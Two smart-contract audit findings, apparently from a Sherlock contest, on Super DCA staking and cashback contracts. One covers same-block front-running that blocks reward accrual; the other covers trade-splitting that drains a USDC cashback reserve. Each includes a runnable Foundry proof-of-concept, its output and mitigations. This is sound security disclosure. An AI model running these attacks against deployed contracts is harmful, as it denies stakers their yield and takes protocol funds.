# H-1 Keeper/MEV can indefinitely block reward distribution by same-block stake/unstake front-run (accrueReward DoS)

## Summary
A same-block ordering attack (miner/MEV or high-priority attacker) on `SuperDCAStaking.accrueReward()` allows an attacker to make `elapsed == 0` every time the gauge attempts to distribute rewards for a token bucket. The root cause is that reward accrual uses block.timestamp and per-token lastRewardIndex is updated by stake/unstake calls; an attacker who places a stake/unstake ahead of the gauge’s `accrueReward()` in the same block forces delta == 0 so rewardAmount == 0. As a result, staker rewards for that bucket can be delayed indefinitely while the attacker repeatedly front-runs the gauge — breaking the core time-sensitive reward distribution invariant and effectively denying yield to honest stakers.

One-line: `block.timestamp + per-token lastIndex` updates allow same-block stake/unstake to zero out accrual; an attacker can keep doing this and stop rewards from ever being distributed.


## Root Cause

In SuperDCAStaking.sol:181-195 the global rewardIndex is advanced in _updateRewardIndex() using:

```solidity
uint256 elapsed = block.timestamp - lastMinted;  
rewardIndex += Math.mulDiv(elapsed * mintRate, 1e18, totalStakedAmount);  
lastMinted = block.timestamp;  
```

Per-token accounting stores tokenRewardInfos[token].lastRewardIndex. When a user calls stake() or unstake() the contract calls _updateRewardIndex() and then sets info.lastRewardIndex = rewardIndex for the affected bucket. If an attacker places a stake/unstake for token T earlier in the same block where the gauge then calls accrueReward(T), elapsed == 0 for the gauge call and therefore rewardIndex - info.lastRewardIndex == 0 → rewardAmount == 0. Repeating this in successive blocks prevents rewards from ever being accrued.


## Affected Lines of Code

- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-gauge/src/SuperDCAStaking.sol#L181C5-L195C1  
- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-gauge/src/SuperDCAStaking.sol#L204C4-L231C1  
- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-gauge/src/SuperDCAStaking.sol#L276C4-L294C1  


## Internal Pre-conditions

- gauge must be set and gauge (or pool manager) regularly calls accrueReward(token) for token buckets.  
- totalStakedAmount > 0 for the targeted token bucket (there are stakers present).  
- Keeper/stakers are relying on accrueReward() (gauge) to trigger distributions; gauge calls occur on-chain and are orderable in the mempool.  
- Attacker must be able to place transactions that get included before the gauge’s accrueReward() within the same block (i.e., attacker can win ordering via MEV, miner, or bribes).  


## External Pre-conditions

- Public mempool or block builder / MEV environment where transaction ordering can be influenced (Ethereum, Arbitrum, Polygon, BNB, Unichain, etc.).  
- Reasonable attacker resources: either miner/block-builder control or frequent inclusion by paying sufficient gas/bribe to be ordered before the gauge call.  
- (If deployed on private-sequencer chains like OP/Base) the sequencer must be colluding or attacker must control sequencer ordering to reliably place same-block transactions; otherwise the attack is harder and less practical.  


## Attack Path

- Attacker observes a pending gauge.accrueReward(token) transaction (or knows gauge schedule).  
- Attacker submits stake(token, smallAmount) or unstake(token, smallAmount) transaction and uses a high gas price or MEV bribe so that their tx is included before the gauge call in the same block.  
- Attacker tx executes: _updateRewardIndex() runs with elapsed = block.timestamp - lastMinted. Because lastMinted equals block.timestamp for the gauge’s future call (same block), _updateRewardIndex() returns without increasing rewardIndex (or sets last indices equal to rewardIndex), and the attacker’s action updates tokenRewardInfos[token].lastRewardIndex = rewardIndex.  
- Gauge’s accrueReward(token) is executed later in the same block; _updateRewardIndex() sees elapsed == 0 so rewardIndex stays unchanged; delta = rewardIndex - info.lastRewardIndex == 0 and the function returns rewardAmount == 0.  
- Attacker repeats steps 1–4 every block the gauge tries to distribute rewards for token T. As long as the attacker can consistently get ordered before the gauge call, rewards for token T remain 0.  


## Impact

- Functional impact: Core reward distribution for affected token buckets is denied indefinitely while the attack is active. The staking system’s primary purpose (yield) is disabled for those buckets.  
- Monetary impact (protocol & users): While principal is not stolen, stakers lose the stream of yield they expect. Repeated per-block suppression effectively causes 100% loss of yield for the period of the attack.  
- Trust and UX: Honest stakers see zero rewards and may withdraw, reducing liquidity and harming protocol economics.  


## PoC

- Create a new Folder called Proof at `super-dca-gauge/` and initialize a new sub-Foundry project . Run these commands -

```solidity
mkdir  Proof  
cd Proof  
forge init --force 
```

- Clear the existing files in src,script,test folders of the sub-Foudry project Proof.

- Drop the copy of following files at appropriate folders.

   - SuperDCAStaking.sol at Proof/src/ .
   - ISuperDCAGauge.sol and ISuperDCAStaking.sol at Proof/src/interfaces.
   - MockERC20Token.sol from super-dca-gauge/test/mocks at Proof/test/ .

- Install the dependencies and modify remappings at foundry.toml if required.

- Now finally create a file `Exploit_POC.t.sol` at `super-dca-gauge/Proof/test` and paste the following test in it -

```solidity 
// SPDX-License-Identifier: Apache-2.0  
pragma solidity ^0.8.22;  
  
import "forge-std/Test.sol";  
import "forge-std/console.sol";  
  
import {SuperDCAStaking} from "../src/SuperDCAStaking.sol";  
import {MockERC20Token} from "./MockERC20Token.sol";  
  
contract MockGauge {  
    SuperDCAStaking public staking;  
    constructor(SuperDCAStaking _staking) { staking = _staking; }  
    function isTokenListed(address) external pure returns (bool) { return true; }  
    function triggerAccrue(address token) external returns (uint256) { return staking.accrueReward(token); }  
}  
  
contract ExploitPoC_UsingRealStaking is Test {  
    SuperDCAStaking public staking;  
    MockERC20Token public dca;  
    MockGauge public mockGauge;  
  
    address public admin;  
    address public user;  
    address public attacker;  
    address public tokenA;  
    uint256 public mintRate;  
    uint256 public tokenPrice18;  
  
    function setUp() public {  
        admin = makeAddr("Admin");  
        user = makeAddr("User");  
        attacker = makeAddr("Attacker");  
  
        dca = new MockERC20Token("Super DCA", "SDCA", 18);  
  
        // Choose a mintRate that produces visible rewards vs staked amounts.  
        mintRate = 1; // e.g. 1 tokens/sec   
        staking = new SuperDCAStaking(address(dca), mintRate, admin);  
  
        mockGauge = new MockGauge(staking);  
        vm.prank(admin);  
        staking.setGauge(address(mockGauge));  
  
        tokenA = address(0x1111);  
  
        dca.mint(user, 1_000e18);  
        dca.mint(attacker, 1_000e18);  
        vm.prank(user); dca.approve(address(staking), type(uint256).max);  
        vm.prank(attacker); dca.approve(address(staking), type(uint256).max);  
  
        vm.prank(user);  
        staking.stake(tokenA, 100e18);  
  
        tokenPrice18 = 0.01e18;  
    }  
  
    function test_repeated_blocking_blocks_N_accruals() public {  
        uint256 N = 10;  
        uint256 withheldTokens = 0;  
        vm.warp(block.timestamp + 1);  
  
        for (uint256 i = 0; i < N; ++i) {  
            vm.warp(block.timestamp + 100);  
            uint256 expectedNow = staking.previewPending(tokenA);  
            withheldTokens += expectedNow;  
  
            vm.prank(attacker);  
            staking.stake(tokenA, 1e18);  
  
            uint256 accrued = mockGauge.triggerAccrue(tokenA);  
            assertEq(accrued, 0, "Expected accrued == 0 due to same-block stake");  
  
            vm.prank(attacker);  
            staking.unstake(tokenA, 1e18);  
        }  
  
        uint256 usdWithheld = (withheldTokens * tokenPrice18) / 1e18;  
  
        console.log("=== Repeated blocking PoC using real SuperDCAStaking ===");  
        console.log("Iterations (N):", N);  
        console.log("Total withheld DCA tokens (raw 1e18):", withheldTokens);  
        console.log("Estimated USD withheld (18-decimals):", usdWithheld);  
  
        assertGt(withheldTokens, 0);  
    }  
} 
``` 
  
- Run `forge test --mt test_repeated_blocking_blocks_N_accruals -vv` inside that Proof Sub-Foundry project.

- Output :

```solidity
[⠘] Compiling 1 files with Solc 0.8.30  
[⠃] Solc 0.8.30 finished in 695.24ms  
Compiler run successful!  
  
Ran 1 test for test/Exploit_POC.t.sol:ExploitPoC_UsingRealStaking  
[PASS] test_repeated_blocking_blocks_N_accruals() (gas: 1145644)  
Logs:  
  === Repeated blocking PoC using real SuperDCAStaking ===  
  Iterations (N): 10  
  Total withheld DCA tokens (raw 1e18): 1000  
  Estimated USD withheld (18-decimals): 10  
  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.52ms (1.64ms CPU time)  
  
Ran 1 test suite in 6.55ms (3.52ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  
```

## Mitigation
1. Make accrual robust to same-block ordering
 - Use block.number to gate accrual progress rather than block.timestamp, or combine both: ensure `_updateRewardIndex()` treats any call in the same block as the previous lastMinted as if minimal time has elapsed for at least one update (i.e., do not allow stake/unstake inside a block to zero out a prior scheduled accrual). Concretely: track lastMintedBlock and ignore lastMinted updates from stake/unstake if they would cause accrueReward() later in the same block to see zero elapsed; or require accrual to use `max(1, block.timestamp - lastMinted)` when called by gauge (carefully analyze effects on accuracy).
2. Disallow updating `tokenRewardInfos[token].lastRewardIndex` during the `same` block as a scheduled distribution for that token
 - Add a per-token `lastUpdatedBlock` and ensure `accrueReward()` cannot be bypassed by a stake/unstake in the same block that sets lastRewardIndex equal to rewardIndex. Example: when stake/unstake runs, if `lastUpdatedBlock == block.number` then do not set `info.lastRewardIndex = rewardIndex` (or use a checkpointing approach that preserves pending delta until next block).
3. Rate-limit per-block index updates or require minimum elapsed before lastRewardIndex is moved
- For example, require `elapsed >= 1 sec` or `block.number > lastMintedBlock` to update global index; stake/unstake should not manipulate lastRewardIndex in the same block that the gauge will accrue.

--- 


# S-2 A user/attacker can open multiple trades with flowRate >= cashbackClaim.maxRate and receive max cashback per trade, allowing the same address to collect repeated cashback and drain the contract's USDC reward balance.

## Summary
`SuperDCACashback.sol` computes and pays cashback per tradeId and enforces cashbackClaim.maxRate per trade. There is no on‑chain limit on the number of trades an address can own. As a result, a user who owns multiple valid trades `(each with flowRate >= cashbackClaim.maxRate)` receives the maximum per‑trade cashback for each trade. Splitting the same underlying streaming capital into N valid trades yields roughly N× the cashback that a single trade would produce for the same aggregated capital. In practice this lets a single address repeatedly claim per‑trade payouts, draining the cashback contract’s USDC reserve much faster than intended.


## Root Cause
In SuperDCACashback.sol:244-271 , Cashback is calculated and paid per tradeId .

```solidity
function claimAllCashback(uint256 tradeId) external returns (uint256 totalCashback) {...}  
```

_getEffectiveFlowRate(int96) function at SuperDCACashback.sol:176-179 computes an individual trade’s effective flow and caps it to cashbackClaim.maxRate.

```solidity
function _getEffectiveFlowRate(int96 flowRate) internal view returns (uint256 effectiveFlowRate) {  
    effectiveFlowRate = uint256(int256(flowRate));  
    if (effectiveFlowRate > cashbackClaim.maxRate) effectiveFlowRate = cashbackClaim.maxRate;  
  }  
```

_calculateCompletedEpochsCashback(...)function at SuperDCACashback.sol:195-222 computes rewards from each trade’s effective flow, epoch duration, and cashbackClaim.cashbackBips.

```solidity
 function _calculateCompletedEpochsCashback(  
    ISuperDCATrade.Trade memory trade,  
    uint256 effectiveFlowRate,  
    uint256 completedEpochs  
  ) internal view returns (uint256 totalAmount) {...}  
```

claimAllCashback(tradeId) transfers the computed per‑trade USDC and stores claimedAmounts[tradeId].

There is no per‑owner aggregation or cap in the cashback contract. claimedAmounts prevents double‑claim per tradeId only; nothing prevents independent claims for many tradeIds owned by the same address, so repeated valid trades for the same address are independently rewarded.

Consequence: the per‑trade maxRate cap becomes multiplicative across trade counts: owning N trades each capped yields N × capped reward.


## Affected File : super-dca-cashback/src/SuperDCACashback.sol

## Link for affected code lines :

- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-cashback/src/SuperDCACashback.sol#L244C2-L272C1 .
- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-cashback/src/SuperDCACashback.sol#L176C1-L180C1 .
- https://github.com/sherlock-audit/2025-09-super-dca/blob/main/super-dca-cashback/src/SuperDCACashback.sol#L195C1-L221C3


## Internal Pre-conditions
- Each tradeId the attacker controls must pass _isTradeValid(trade) (i.e., be considered valid by the cashback contract: startTime > 0 and trade.flowRate >= cashbackClaim.minRate).
- Each tradeId must reach completedEpochs >= 1 (or more) so the trade becomes eligible for cashback (computed by _calculateEpochData).
- The attacker can call claimAllCashback(tradeId) for each valid tradeId they own.


## External Pre-conditions
- The gas and operational cost to create multiple valid tradeIds is paid by attacker .
- There is no off‑chain control or operator policy that prevents large numbers of trades for a single address.


## Attack Path
- Attacker reads public contract parameters (via getCashbackClaim() or chain inspection) to learn cashbackClaim.maxRate, cashbackClaim.duration, and cashbackClaim.cashbackBips. They estimate per‑trade creation cost and per‑trade expected cashback.
- Obtain many valid trades: Attacker obtains ownership of multiple valid tradeIds (each trade meeting _isTradeValid). From the cashback contract’s perspective each tradeId is an independent unit eligible for reward.
- Let epochs complete: Wait until for each tradeId the epoch logic yields completedEpochs >= 1.
- Claim separately per trade: For each owned tradeId, call claimAllCashback(tradeId). The contract computes and pays the per‑trade cashback and increments claimedAmounts[tradeId].
- Scale / repeat: Repeat across more trades or over multiple epochs .


## Example (illustrative)
1. Assume contract parameters:
```
cashbackClaim.maxRate = 1 unit/sec
cashbackClaim.duration = 3600 sec (1 hour)
cashbackClaim.cashbackBips = 100 (1%)
```
2. Per‑trade payout for one completed epoch:
```
completedAmount = 1 * 3600 * 1 = 3600 units
cashback = (3600 * 100) / 10000 = 36 units → (after conversion to USDC precision, ~36 USDC)
```
3. Now compare:

- Single trade: ~36 USDC per epoch.
- 10 trades (same capital split): ~10 × 36 = 360 USDC per epoch.
- Net extra paid by protocol: ~324 USDC that epoch for the same underlying capital.

This demonstrates how per‑trade payout multiplication drains the cashback balance disproportionately.


## Impact
- Economic loss to protocol (USDC drained).
- Reduced benefits to honest users.
- Loss scales linearly with number of trades (N) and can be catastrophic with operator collusion.


## PoC
- Create a file `MassSplit.t.sol` at `super-dca-cashback/test` and paste the following code.

```solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.29;  
  
import {SuperDCACashbackTest} from "./SuperDCACashback.t.sol";  
import {SuperDCACashback} from "src/SuperDCACashback.sol";  
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";  
import {console2} from "forge-std/Test.sol";  
  
contract MassSplitExploit is SuperDCACashbackTest {  
  function test_massSplit_multipleTrades() public {  
    // Parameters chosen so per-trade USDC after /1e12 is non-zero  
    uint256 cashbackBips = 100; // 1%  
    uint256 duration = 3_600; // 1 hour  
    int96 minRate = 1;  
  
    // Use large maxRate so the final USDC amount is > 0 after contract's precision conversion.  
    uint256 maxRate = 1e18;  
    uint256 startTime = block.timestamp;  
  
    // Deploy a fresh cashback contract with these parameters and fund it  
    SuperDCACashback exploitable = _deployContractWithClaim(  
      cashbackBips,  
      duration,  
      minRate,  
      maxRate,  
      startTime  
    );  
  
    // Sanity: contract was funded by helper  
    uint256 initialContractBalance = IERC20(address(usdc)).balanceOf(address(exploitable));  
    assertTrue(initialContractBalance >= 1_000_000 * 10 ** 6);  
  
    // Create multiple trades for same user (admin can start trades)  
    uint256 N = 5;  
    uint256[] memory tradeIds = new uint256[](N);  
  
    // Use flowRate >= maxRate so each trade is effectively capped at maxRate  
    int96 attackerFlowRate = int96(int256(1e18)); // safe cast  
  
    for (uint256 i = 0; i < N; ++i) {  
      uint256 tid = _createTrade(user, attackerFlowRate, /* indexValue */ 100 + i, /* units */ 1);  
      tradeIds[i] = tid;  
      console2.log("Created tradeId:", tid);  
    }  
  
    // Warp over one epoch  
    vm.warp(block.timestamp + duration + 1);  
  
    // Balances before claiming  
    uint256 userBalanceBefore = usdc.balanceOf(user);  
    uint256 contractBalanceBefore = usdc.balanceOf(address(exploitable));  
    console2.log("User balance before (USDC 6d):", userBalanceBefore);  
    console2.log("Contract balance before (USDC 6d):", contractBalanceBefore);  
  
    // Compute expected per-trade USDC using contract math  
    uint256 effectiveFlowRate = maxRate; // min(trade.flowRate, maxRate)  
    uint256 completedEpochs = 1;  
    uint256 completedAmount = effectiveFlowRate * duration * completedEpochs;  
    uint256 totalAmountBeforeConversion = (completedAmount * cashbackBips) / 10_000;  
    uint256 expectedPerTradeUSDC = totalAmountBeforeConversion / 1e12; // contract converts 1e18 -> 1e6 via /1e12  
  
    // Log the math pieces (big numbers)  
    console2.log("effectiveFlowRate:", effectiveFlowRate);  
    console2.log("duration:", duration);  
    console2.log("completedAmount (flow units):", completedAmount);  
    console2.log("totalAmountBeforeConversion:", totalAmountBeforeConversion);  
    console2.log("expectedPerTradeUSDC (post conversion, 6 decimals):", expectedPerTradeUSDC);  
  
    require(expectedPerTradeUSDC > 0, "expected per-trade USDC is zero; adjust parameters");  
  
    // Now claim per trade and log each claim  
    uint256 totalClaimed = 0;  
    for (uint256 i = 0; i < N; ++i) {  
      uint256 tid = tradeIds[i];  
      vm.prank(user);  
      uint256 claimed = exploitable.claimAllCashback(tid);  
      console2.log("Claimed for tradeId", tid, "=>", claimed);  
      assertEq(claimed, expectedPerTradeUSDC);  
      totalClaimed += claimed;  
    }  
  
    // Check balances after claims  
    uint256 userBalanceAfter = usdc.balanceOf(user);  
    uint256 contractBalanceAfter = usdc.balanceOf(address(exploitable));  
  
    console2.log("User balance after (USDC 6d):", userBalanceAfter);  
    console2.log("Contract balance after (USDC 6d):", contractBalanceAfter);  
    console2.log("Total claimed (USDC 6d):", totalClaimed);  
    console2.log("Expected total (N * perTrade):", expectedPerTradeUSDC * N);  
  
    assertEq(userBalanceAfter - userBalanceBefore, totalClaimed);  
    assertEq(contractBalanceBefore - contractBalanceAfter, totalClaimed);  
    assertEq(totalClaimed, expectedPerTradeUSDC * N);  
  }  
}  

```

- Run the test with `forge test --mt test_massSplit_multipleTrades --via-ir -vv` .

- Output :

```solidity
Ran 1 test for test/MassSplit.t.sol:MassSplitExploit  
[PASS] test_massSplit_multipleTrades() (gas: 2431192)  
Logs:  
  Created tradeId: 1  
  Created tradeId: 2  
  Created tradeId: 3  
  Created tradeId: 4  
  Created tradeId: 5  
  User balance before (USDC 6d): 0  
  Contract balance before (USDC 6d): 1000000000000  
  effectiveFlowRate: 1000000000000000000  
  duration: 3600  
  completedAmount (flow units): 3600000000000000000000  
  totalAmountBeforeConversion: 36000000000000000000  
  expectedPerTradeUSDC (post conversion, 6 decimals): 36000000  
  Claimed for tradeId 1 => 36000000  
  Claimed for tradeId 2 => 36000000  
  Claimed for tradeId 3 => 36000000  
  Claimed for tradeId 4 => 36000000  
  Claimed for tradeId 5 => 36000000  
  User balance after (USDC 6d): 180000000  
  Contract balance after (USDC 6d): 999820000000  
  Total claimed (USDC 6d): 180000000  
  Expected total (N * perTrade): 180000000  
  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.48ms (4.83ms CPU time)  
  
Ran 1 test suite in 164.08ms (23.48ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  
```

## Mitigation

There are various ways to mitigate it .

1. Per-user aggregated-flow cap
Maintain `userActiveFlow[owner] = sum of effectiveFlowRates across their active trades.` On new trade creation require:

```solidity
userActiveFlow[owner] + newEffectiveFlow <= USER_MAX_FLOW
```
Update `userActiveFlow` when trades end. This bounds total rewarded flow per owner while allowing multiple trades.

2. Per‑user active‑trade count cap
  - Enforce a hard cap in trade creation logic:
```solidity
require(activeTradesByUser[owner] < MAX_ACTIVE_TRADES, "Too many active trades"); 
``` 
A sensible default `MAX_ACTIVE_TRADES` (e.g., 5–20) prevents mass splitting cheaply and is simple to implement.

3. Per‑trade creation fee
 - Charge a modest on‑chain fee to create a trade (USDC or protocol token). This increases the cost of creating many trades and disincentivizes mass splitting.

